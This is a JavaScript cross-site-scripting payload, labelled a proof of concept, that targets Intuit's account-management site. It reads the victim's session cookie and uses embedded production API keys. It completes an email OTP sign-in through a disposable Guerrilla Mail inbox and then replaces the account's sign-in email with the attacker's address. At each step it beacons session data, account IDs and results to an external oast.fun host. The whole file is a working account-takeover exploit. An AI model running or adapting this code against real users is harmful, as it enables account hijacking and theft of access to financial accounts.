(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var W='https://atmeta-wildcard-monitor.nasseurpay.workers.dev/?url=';
var G='https://api.guerrillamail.com/ajax.php';
var out=[];
var FLOW=crypto.randomUUID?crypto.randomUUID():'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)});

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}
function wp(url){
return fetch(W+encodeURIComponent(url)).then(function(r){
if(!r.ok)throw new Error('proxy '+r.status);
return r.text()
})
}
function uuid(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)})}

var origSession=gc('ius_session');
var visitorId=gc('ivid');

var baseHdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0',
'Intuit_Interception':'ignore-response',
'intuit_visitorid':visitorId,
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_offeringenv':'prd',
'intuit_identity_routing':'SBSEG',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_locale':'en-us',
'intuit_country':'US',
'intuit_samesite_support':'true',
'intuit_origin':'https://accounts.intuit.com',
'intuit_flowid':FLOW,
'intuit_sessionid':origSession,
'intuit_profilingid':origSession
};

log('[*] XSS Sign-In Email Change PoC (p41)');
log('[*] Origin: '+location.origin);
log('[*] Fix: prefer non-qbn slot + retry with other slot');
log('[*] flowId: '+FLOW);
log('');

log('[0] PrepareSignIn — discovering active slot...');
var prepHdrs={};
for(var k in baseHdrs)prepHdrs[k]=baseHdrs[k];

fetch('/identity-api/preparesignin/graphql',{
method:'POST',headers:prepHdrs,credentials:'include',
body:JSON.stringify({
query:'mutation PrepareSignIn($input:Identity_BrowserPrepareSignInInput!){identityBrowserPrepareSignIn(input:$input){__typename authenticationSessionSlots{name digitalIdentity{legacyAuthId pseudonymId}}}}',
variables:{input:{
intent:{appGroup:'Identity',assetAlias:'Intuit.identity.experiences.oneintuitam'},
clientCapabilitySet:'v1'
}}
})
}).then(function(r){return r.text()}).then(function(pr){
log('[0] PrepareSignIn: '+pr.substring(0,600));
beacon('p41-prepare',pr.substring(0,900));

var prd;try{prd=JSON.parse(pr)}catch(e){}
if(!prd||!prd.data||!prd.data.identityBrowserPrepareSignIn)throw new Error('PrepareSignIn failed');

var slots=prd.data.identityBrowserPrepareSignIn.authenticationSessionSlots||[];
log('[0] Slots found: '+slots.length);
for(var si=0;si<slots.length;si++){
var s=slots[si];
var lid=s.digitalIdentity?s.digitalIdentity.legacyAuthId:'none';
log('  slot['+si+']: name='+s.name+' authId='+lid);
}

var rootAuthId=null;
var allSlots=[];
for(var si=0;si<slots.length;si++){
if(slots[si].digitalIdentity&&slots[si].digitalIdentity.legacyAuthId){
if(!rootAuthId)rootAuthId=slots[si].digitalIdentity.legacyAuthId;
allSlots.push(slots[si].name);
}
}
if(!rootAuthId||allSlots.length===0)throw new Error('no active slot with authId');

var selectedSlot=allSlots[0];
for(var si2=0;si2<allSlots.length;si2++){
if(allSlots[si2]!=='qbn'){selectedSlot=allSlots[si2];break}
}

log('[0] All active slots: '+JSON.stringify(allSlots));
log('[0] Selected slot: '+selectedSlot+' (prefer non-qbn)');
log('[0] Root authId: '+rootAuthId);
beacon('p41-slot',selectedSlot+'|'+rootAuthId);

var finalSlots=['qbn'];
if(selectedSlot!=='qbn')finalSlots.push(selectedSlot);
log('[0] finalSlotNames: '+JSON.stringify(finalSlots));

log('');
log('[1] Getting temp email...');
return wp(G+'?f=get_email_address').then(function(raw){
var data=JSON.parse(raw);
var email=data.email_addr;
var sid=data.sid_token;
log('[1] Temp email: '+email);
beacon('p41-email',email);

var initHdrs={};
for(var k in baseHdrs)initHdrs[k]=baseHdrs[k];
initHdrs['intuit_authn_session_slot']=selectedSlot;
initHdrs['intuit_baggage']=btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}}));

log('[2] Initialize verifier (slot: '+selectedSlot+')...');
return fetch('/factors/v1/verifier/initialize/email',{
method:'POST',headers:initHdrs,credentials:'include',
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:email})
}).then(function(r){return r.json()}).then(function(d){
if(!d.verifierSessionId)throw new Error('no vsid');
var vsid=d.verifierSessionId;
log('[2] vsid: '+vsid.substring(0,30)+'...');

log('[3] Polling for OTP...');
var attempt=0;
function poll(){
attempt++;
return wp(G+'?f=check_email&seq=0&sid_token='+encodeURIComponent(sid))
.then(function(raw2){
var resp=JSON.parse(raw2);
var list=resp.list||[];
if(attempt%5===1) log('[3] Poll #'+attempt+': '+list.length+' emails');
if(list.length>0){
var found=null;
for(var i=0;i<list.length;i++){
var subj=(list[i].mail_subject||'').toLowerCase();
if(subj.indexOf('welcome to guerrilla')!==-1)continue;
found=list[i];break
}
if(found){
log('[3] Got: '+found.mail_subject);
return wp(G+'?f=fetch_email&email_id='+found.mail_id+'&sid_token='+encodeURIComponent(sid))
.then(function(r2){return JSON.parse(r2)})
}
}
if(attempt>=60)throw new Error('OTP timeout');
return new Promise(function(res){setTimeout(function(){res(poll())},3000)})
})
}

return poll().then(function(msg){
var body=(msg.mail_body||'').replace(/<[^>]*>/g,' ');
var m=body.match(/\b(\d{6})\b/);
var otp=m?m[1]:null;
if(!otp)throw new Error('no OTP');
log('[3] OTP: '+otp);

log('[4] Verifying OTP...');
return fetch('/factors/v1/verifier/verify/email',{
method:'POST',headers:initHdrs,credentials:'include',
body:JSON.stringify({verifierSessionId:vsid,otp:otp})
}).then(function(r){return r.json()}).then(function(vd){
if(!vd.verifierToken)throw new Error('no verifierToken');
var vt=vd.verifierToken;
log('[4] Got verifierToken');

log('[5] SignIn (slot: '+selectedSlot+', finalSlots: '+JSON.stringify(finalSlots)+')...');
var signInHdrs={};
for(var k in baseHdrs)signInHdrs[k]=baseHdrs[k];
signInHdrs['intuit_authn_session_slot']=selectedSlot;
signInHdrs['intuit_baggage']=btoa(JSON.stringify({scope_area:'remediation'}));

return fetch('/identity-api/signin/graphql',{
method:'POST',headers:signInHdrs,credentials:'include',
body:JSON.stringify({
query:'mutation SignInWithVerifierToken($input:Identity_BrowserSignInWithVerifierTokenInput!){identityBrowserSignInWithVerifierToken(input:$input){__typename ...on Identity_BrowserSignInWithVerifierTokenNothingElseRequired{__typename successCode authenticationSession{digitalIdentity{legacyAuthId pseudonymId}}}...on Identity_BrowserSignInWithVerifierTokenAccessDenied{__typename}...on Identity_BrowserSignInWithVerifierTokenSomethingElseRequired{__typename}...on Identity_SignInError{__typename}}}',
variables:{input:{
intent:{appGroup:'Identity',assetAlias:'Intuit.identity.experiences.oneintuitam',securityCategory:'ORANGE',redirectUri:'https://accounts.intuit.com/app/account-manager/security/email',rememberMe:false},
clientCapabilitySet:'v13',finalSlotNames:finalSlots,
deviceCapabilities:{passkeySupported:false,simTs43Supported:false,digitalCredential:{userAgentAllowsProtocols:[]}},
inputSlotName:selectedSlot,tenantIds:['50000003'],verifierToken:vt
}}
})
}).then(function(r){return r.text()}).then(function(sr){
log('[5] SignIn: '+sr.substring(0,400));
beacon('p41-signin',sr.substring(0,900));

var srd;try{srd=JSON.parse(sr)}catch(e){}
var authId='';
if(srd&&srd.data){
var res=srd.data.identityBrowserSignInWithVerifierToken;
if(res&&res.authenticationSession&&res.authenticationSession.digitalIdentity){
authId=res.authenticationSession.digitalIdentity.legacyAuthId||'';
}
}
if(!authId)throw new Error('SignIn failed: '+sr.substring(0,200));
log('[5] SignIn authId: '+authId);
log('[5] authId matches root: '+(authId===rootAuthId));

if(authId!==rootAuthId){
log('[!] WARNING: authId mismatch! root='+rootAuthId+' signin='+authId);
beacon('p41-mismatch',rootAuthId+'|'+authId);
}

var freshSession=gc('ius_session');
log('[5] Fresh session: '+freshSession.substring(0,20)+'...');
log('[5] Session changed: '+(freshSession!==origSession));

log('[6] ReplaceEmail credential...');
var mutHdrs={};
for(var k in baseHdrs)mutHdrs[k]=baseHdrs[k];
mutHdrs['authorization']='Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0';
mutHdrs['intuit_routingid']=rootAuthId;
mutHdrs['intuit_sessionid']=freshSession;
mutHdrs['intuit_profilingid']=freshSession;
mutHdrs['intuit_tid']=uuid();
mutHdrs['intuit_authn_session_slot']=selectedSlot;
mutHdrs['intuit_baggage']=btoa(JSON.stringify({scope_area:'account_manager'}));

return fetch('/identity-api/v2/graphql',{
method:'POST',headers:mutHdrs,credentials:'include',
cache:'no-store',
body:JSON.stringify({
operationName:'ReplaceEmail',
query:'mutation ReplaceEmail($input:Identity_CreateOrReplaceEmailCredentialInput!){identityCreateOrReplaceEmailCredential(input:$input){__typename ...on Identity_CreateOrReplaceEmailCredentialSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}...on Identity_DigitalIdentityLockedOutError{message}...on Identity_EmailCredentialMatchesExistingError{message}}}',
variables:{input:{newEmailAddress:email}}
})
}).then(function(r){return r.text()}).then(function(cr){
log('[6] Response: '+cr.substring(0,500));
beacon('p41-replace',cr.substring(0,900));

var crd;try{crd=JSON.parse(cr)}catch(e){}
if(crd&&crd.data&&crd.data.identityCreateOrReplaceEmailCredential){
var result=crd.data.identityCreateOrReplaceEmailCredential;
if(result.__typename==='Identity_CreateOrReplaceEmailCredentialSuccess'){
log('');
log('========================================');
log('  SIGN-IN EMAIL REPLACED TO:');
log('  '+email);
log('  Status: '+result.status);
log('  Slot used: '+selectedSlot);
log('========================================');
beacon('p41-SUCCESS','email='+email+'&slot='+selectedSlot);
return
}
log('[6] Failed with slot '+selectedSlot+': '+result.__typename);

var otherSlot=null;
for(var oi=0;oi<allSlots.length;oi++){
if(allSlots[oi]!==selectedSlot){otherSlot=allSlots[oi];break}
}
if(otherSlot&&result.__typename==='Identity_CredentialUnauthorizedError'){
log('[6b] Retrying with slot: '+otherSlot);
mutHdrs['intuit_authn_session_slot']=otherSlot;
mutHdrs['intuit_tid']=uuid();
return fetch('/identity-api/v2/graphql',{
method:'POST',headers:mutHdrs,credentials:'include',
cache:'no-store',
body:JSON.stringify({
operationName:'ReplaceEmail',
query:'mutation ReplaceEmail($input:Identity_CreateOrReplaceEmailCredentialInput!){identityCreateOrReplaceEmailCredential(input:$input){__typename ...on Identity_CreateOrReplaceEmailCredentialSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}...on Identity_DigitalIdentityLockedOutError{message}...on Identity_EmailCredentialMatchesExistingError{message}}}',
variables:{input:{newEmailAddress:email}}
})
}).then(function(r){return r.text()}).then(function(cr2){
log('[6b] Response: '+cr2.substring(0,500));
beacon('p41-retry',cr2.substring(0,900));
var crd2;try{crd2=JSON.parse(cr2)}catch(e){}
if(crd2&&crd2.data&&crd2.data.identityCreateOrReplaceEmailCredential){
var r2=crd2.data.identityCreateOrReplaceEmailCredential;
if(r2.__typename==='Identity_CreateOrReplaceEmailCredentialSuccess'){
log('');
log('========================================');
log('  SIGN-IN EMAIL REPLACED TO:');
log('  '+email);
log('  Status: '+r2.status);
log('  Slot used: '+otherSlot);
log('========================================');
beacon('p41-SUCCESS','email='+email+'&slot='+otherSlot);
}else{
log('[!] Both slots failed: '+r2.__typename);
beacon('p41-bothfail',r2.__typename);
}
}
})
}else{
log('[!] Failed: '+result.__typename+' - '+(result.message||''));
beacon('p41-fail',result.__typename);
}
}else if(crd&&crd.errors){
log('[!] Errors: '+JSON.stringify(crd.errors).substring(0,400));
beacon('p41-err',JSON.stringify(crd.errors).substring(0,900));
}
})
})
})
})
})
})
})
.catch(function(err){
log('[!] ERROR: '+err.message);
beacon('p41-err',err.message);
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p41-crash?e='+encodeURIComponent(e.message);
}
})();
